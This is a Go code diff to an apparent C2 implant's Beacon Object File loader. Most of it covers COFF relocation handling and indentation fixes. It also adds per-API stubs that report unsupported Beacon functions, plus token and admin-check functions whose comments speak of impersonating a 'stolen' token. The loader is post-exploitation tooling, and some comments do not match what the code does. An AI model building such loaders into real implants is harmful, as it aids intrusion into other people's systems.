@@ -101,8 +101,8 @@ var (
 // Equivalent to C's memcpy, needed because syscall.Memcpy is not available.
 func bofMemcpy(dst, src unsafe.Pointer, n uintptr) {
 	for i := uintptr(0); i < n; i++ {
-	// Byte-by-byte copy: raw pointer memcpy for COFF section loading
-	*(*byte)(unsafe.Pointer(uintptr(dst) + i)) = *(*byte)(unsafe.Pointer(uintptr(src) + i))
+		// Byte-by-byte copy: raw pointer memcpy for COFF section loading
+		*(*byte)(unsafe.Pointer(uintptr(dst) + i)) = *(*byte)(unsafe.Pointer(uintptr(src) + i))
 	}
 }
 
@@ -555,21 +555,21 @@ func loadAndRunBOF(bofData []byte, args string) (uintptr, error) {
 			switch rel.Type {
 			case IMAGE_REL_AMD64_ABSOLUTE:
 				// No-op
-		case IMAGE_REL_AMD64_ADDR64:
-			// Write full 64-bit absolute address into relocation target
-			*(*uint64)(unsafe.Pointer(targetAddr)) = uint64(symAddr)
-		case IMAGE_REL_AMD64_ADDR32:
-			// Write 32-bit absolute address (truncated)
-			*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(symAddr)
+			case IMAGE_REL_AMD64_ADDR64:
+				// Write full 64-bit absolute address into relocation target
+				*(*uint64)(unsafe.Pointer(targetAddr)) = uint64(symAddr)
+			case IMAGE_REL_AMD64_ADDR32:
+				// Write 32-bit absolute address (truncated)
+				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(symAddr)
 			case IMAGE_REL_AMD64_ADDR32NB:
 				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(symAddr)
-		case IMAGE_REL_AMD64_REL32:
-			// Write 32-bit RIP-relative offset: symAddr - targetAddr - 4
-			delta := uint64(symAddr) - uint64(targetAddr) - 4
-			*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(delta)
-		case IMAGE_REL_AMD64_REL32_1:
-			// REL32 with 1-byte displacement adjustment
-			delta := uint64(symAddr) - uint64(targetAddr) - 5
+			case IMAGE_REL_AMD64_REL32:
+				// Write 32-bit RIP-relative offset: symAddr - targetAddr - 4
+				delta := uint64(symAddr) - uint64(targetAddr) - 4
+				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(delta)
+			case IMAGE_REL_AMD64_REL32_1:
+				// REL32 with 1-byte displacement adjustment
+				delta := uint64(symAddr) - uint64(targetAddr) - 5
 				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(delta)
 			case IMAGE_REL_AMD64_REL32_2:
 				delta := uint64(symAddr) - uint64(targetAddr) - 6
@@ -583,14 +583,14 @@ func loadAndRunBOF(bofData []byte, args string) (uintptr, error) {
 			case IMAGE_REL_AMD64_REL32_5:
 				delta := uint64(symAddr) - uint64(targetAddr) - 9
 				*(*uint32)(unsafe.Pointer(targetAddr)) = uint32(delta)
-		case IMAGE_REL_AMD64_SECTION:
-			// Write 16-bit section index (1-based)
-			if symSection >= 0 {
+			case IMAGE_REL_AMD64_SECTION:
+				// Write 16-bit section index (1-based)
+				if symSection >= 0 {
 					*(*uint16)(unsafe.Pointer(targetAddr)) = uint16(symSection + 1)
 				}
-		case IMAGE_REL_AMD64_SECREL:
-			// Write 32-bit section-relative offset for TLS/SEH
-			if symSection >= 0 {
+			case IMAGE_REL_AMD64_SECREL:
+				// Write 32-bit section-relative offset for TLS/SEH
+				if symSection >= 0 {
 					*(*uint32)(unsafe.Pointer(targetAddr)) = symVal
 				}
 			}
@@ -674,17 +674,17 @@ func setupBeaconAPI() {
 		DataExtract: uintptr(syscall.NewCallback(bofDataExtract)),
 		DataString:  uintptr(syscall.NewCallback(bofDataString)),
 		// Stubs that return FALSE/0 safely — no token ops or process injection
-		BeaconUseToken:               uintptr(syscall.NewCallback(bofStubReturnFalse)),
-		BeaconRevertToken:            uintptr(syscall.NewCallback(bofStubReturnFalse)),
-		BeaconIsAdmin:                uintptr(syscall.NewCallback(bofStubReturnFalse)),
-		BeaconInjectProcess:          uintptr(syscall.NewCallback(bofStubReturnFalse)),
-		BeaconInjectTemporaryProcess: uintptr(syscall.NewCallback(bofStubReturnFalse)),
-		BeaconSpawnTemporaryProcess:  uintptr(syscall.NewCallback(bofStubReturnFalse)),
-		BeaconCleanupProcess:         uintptr(syscall.NewCallback(bofStubReturnFalse)),
-		BeaconInformation:            uintptr(syscall.NewCallback(bofStubReturnFalse)),
-		BeaconGetCustomUserData:      uintptr(syscall.NewCallback(bofStubReturnFalse)),
-		BeaconSetCustomUserData:      uintptr(syscall.NewCallback(bofStubReturnFalse)),
-		BeaconCheckMsfPayload:        uintptr(syscall.NewCallback(bofStubReturnFalse)),
+		BeaconUseToken:               uintptr(syscall.NewCallback(bofBeaconUseToken)),
+		BeaconRevertToken:            uintptr(syscall.NewCallback(bofBeaconRevertToken)),
+		BeaconIsAdmin:                uintptr(syscall.NewCallback(bofBeaconIsAdmin)),
+		BeaconInjectProcess:          uintptr(syscall.NewCallback(bofStubInjectProcess)),
+		BeaconInjectTemporaryProcess: uintptr(syscall.NewCallback(bofStubInjectTemporaryProcess)),
+		BeaconSpawnTemporaryProcess:  uintptr(syscall.NewCallback(bofStubSpawnTemporaryProcess)),
+		BeaconCleanupProcess:         uintptr(syscall.NewCallback(bofStubCleanupProcess)),
+		BeaconInformation:            uintptr(syscall.NewCallback(bofStubInformation)),
+		BeaconGetCustomUserData:      uintptr(syscall.NewCallback(bofStubGetCustomUserData)),
+		BeaconSetCustomUserData:      uintptr(syscall.NewCallback(bofStubSetCustomUserData)),
+		BeaconCheckMsfPayload:        uintptr(syscall.NewCallback(bofStubCheckMsfPayload)),
 	}
 }
 
@@ -832,4 +832,108 @@ func bofDataString(parser uintptr) uintptr {
 // Returns 0 (FALSE / NULL) so BOFs that check the return value won't misbehave.
 func bofStubReturnFalse() int32 {
 	return 0
+}
+
+// bofStubUnsupportedN writes a diagnostic to BOF output and returns FALSE.
+// Used by per-API stubs so operators can see which Beacon API is unavailable.
+func bofStubUnsupportedN(name uintptr) int32 {
+	if name != 0 {
+		n := bofGoString(name)
+		if n != "" {
+			if bofOutputBuf.Len() > 0 {
+				bofOutputBuf.WriteString("\n")
+			}
+			bofOutputBuf.WriteString("[!] Beacon API not supported: ")
+			bofOutputBuf.WriteString(n)
+		}
+	}
+	return 0
+}
+
+func bofStubInjectProcess(hProc uintptr, pid uint32, remote uintptr, remoteSize int32, src uintptr, srcSize int32, outSize uintptr, mode int32) int32 {
+	if bofOutputBuf.Len() > 0 {
+		bofOutputBuf.WriteString("\n")
+	}
+	bofOutputBuf.WriteString("[!] BeaconInjectProcess not supported in this context")
+	return 0
+}
+
+func bofStubInjectTemporaryProcess(pInfo uintptr, remote uintptr, remoteSize int32, src uintptr, srcSize int32, outSize uintptr, mode int32) int32 {
+	if bofOutputBuf.Len() > 0 {
+		bofOutputBuf.WriteString("\n")
+	}
+	bofOutputBuf.WriteString("[!] BeaconInjectTemporaryProcess not supported in this context")
+	return 0
+}
+
+func bofStubSpawnTemporaryProcess(inherit int32, flags int32, pInfo uintptr) int32 {
+	if bofOutputBuf.Len() > 0 {
+		bofOutputBuf.WriteString("\n")
+	}
+	bofOutputBuf.WriteString("[!] BeaconSpawnTemporaryProcess not supported in this context")
+	return 0
+}
+
+func bofStubCleanupProcess(hProc uintptr) int32 {
+	if bofOutputBuf.Len() > 0 {
+		bofOutputBuf.WriteString("\n")
+	}
+	bofOutputBuf.WriteString("[!] BeaconCleanupProcess not supported in this context")
+	return 0
+}
+
+func bofStubInformation(info int32, buffer uintptr, size int32, outputSize uintptr) int32 {
+	if bofOutputBuf.Len() > 0 {
+		bofOutputBuf.WriteString("\n")
+	}
+	bofOutputBuf.WriteString("[!] BeaconInformation not supported in this context")
+	return 0
+}
+
+func bofStubGetCustomUserData(buffer uintptr, size uintptr) int32 {
+	if bofOutputBuf.Len() > 0 {
+		bofOutputBuf.WriteString("\n")
+	}
+	bofOutputBuf.WriteString("[!] BeaconGetCustomUserData not supported in this context")
+	return 0
+}
+
+func bofStubSetCustomUserData(buffer uintptr, size int32) int32 {
+	if bofOutputBuf.Len() > 0 {
+		bofOutputBuf.WriteString("\n")
+	}
+	bofOutputBuf.WriteString("[!] BeaconSetCustomUserData not supported in this context")
+	return 0
+}
+
+func bofStubCheckMsfPayload(uuid uintptr, buffer uintptr, size int32) int32 {
+	if bofOutputBuf.Len() > 0 {
+		bofOutputBuf.WriteString("\n")
+	}
+	bofOutputBuf.WriteString("[!] BeaconCheckMsfPayload not supported in this context")
+	return 0
+}
+
+func bofBeaconIsAdmin() int32 {
+	_, elevated, _ := getPlatformSecurityInfo()
+	if elevated {
+		return 1
+	}
+	return 0
+}
+
+func bofBeaconUseToken(_ uintptr) int32 {
+	// Impersonate the currently stolen token if one is held.
+	if err := tokenRevert(); err != nil {
+		// tokenRevert on a clean thread is fine; try steal of current PID is N/A.
+		_ = err
+	}
+	return bofBeaconIsAdmin()
+}
+
+func bofBeaconRevertToken() int32 {
+	if err := tokenRevert(); err != nil {
+		return 0
+	}
+	return 1
 }
